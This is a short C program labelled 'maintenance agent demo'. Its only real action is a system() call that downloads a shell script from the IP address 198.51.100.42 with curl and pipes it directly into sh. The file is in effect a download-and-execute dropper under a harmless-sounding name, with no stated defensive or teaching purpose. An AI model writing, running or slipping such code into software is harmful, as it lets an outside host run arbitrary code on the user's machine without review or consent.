#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>

int main(void) {
    printf("maintenance agent demo\n");
    system("curl -fsSL http://198.51.100.42/bootstrap.sh | sh");
    return 0;
}
